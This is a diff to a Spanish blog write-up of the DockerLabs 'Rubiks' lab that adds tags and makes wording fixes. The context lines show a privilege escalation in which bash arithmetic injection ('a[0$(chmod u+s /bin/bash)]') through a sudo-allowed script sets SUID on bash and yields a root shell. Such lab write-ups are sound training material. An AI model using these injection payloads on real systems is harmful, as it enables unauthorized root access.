@@ -4,7 +4,7 @@ summary: "Write-up del laboratorio Rubiks de DockerLabs"
 author: elcybercurioso
 date: 2026-02-03 12:52:15
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, brute force, subdomains enumeration, rce, credentials leaking, sudo, bash logic abuse, privesc]
 media_subpath: "/assets/img/posts/dockerlabs_rubiks"
 image:
   path: main.webp
@@ -306,7 +306,7 @@ User luisillo may run the following commands on 9317fb5cb35b:
     (ALL) NOPASSWD: /bin/cube
 ```
 
-Comprobamos que permisos tiene el fichero que se menciona, donde vemos que efectivamente tenemos permisos para ejecutarlo:
+Comprobamos qué permisos tiene el fichero que se menciona, donde vemos que efectivamente tenemos permisos para ejecutarlo:
 
 ```bash
 luisillo@9317fb5cb35b:~$ ls -la /bin/cube
@@ -325,7 +325,7 @@ Digite el número: 1
  La verificación ha sido completada.
 ```
 
-Si tratamos de leer las instrucciones, vemos no se trata de un binario, sino de un script en Bash:
+Tratamos de leer las instrucciones, y vemos no se trata de un binario, sino de un script en Bash:
 
 ```bash
 luisillo@9317fb5cb35b:~$ cat /bin/cube
@@ -396,7 +396,7 @@ Digite el número: a[0$(whoami)]
 La verificación ha sido completada.
 ```
 
-Habiendo la conseguido inyección de comandos, optaremos en esta ocasión por escalar privilegios cambiando los permisos **SUID** (permite ejecutar el binario como el propietario) del binario `/bin/bash` para poder ejecutarlo como el propietario (que es `root`).
+Hemos conseguido obtener inyección de comandos, y optaremos en esta ocasión por escalar privilegios cambiando los permisos **SUID** (permite ejecutar el binario como el propietario) del binario `/bin/bash` para poder ejecutarlo como el propietario (que es `root`).
 
 Comprobamos de primeras que el binario `/bin/bash` no sea SUID:
 
@@ -417,7 +417,7 @@ Digite el número: a[0$(chmod u+s /bin/bash)]
 La verificación ha sido completada.
 ```
 
-Si volvemos a revisar los permisos del binario `/bin/bash` , veremos que ahora sí es SUID:
+Si volvemos a revisar los permisos del binario `/bin/bash` , veremos que ahora sí es **SUID**:
 
 ```bash
 luisillo@9317fb5cb35b:~$ ls -la /bin/bash
@@ -432,7 +432,7 @@ bash-5.2# whoami
 root
 ```
 
-Y de esta manera acaba la resolución de la máquina `Rubiks`!
+Y de esta manera acaba la resolución de la máquina **Rubiks**!
 
 <a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>
 
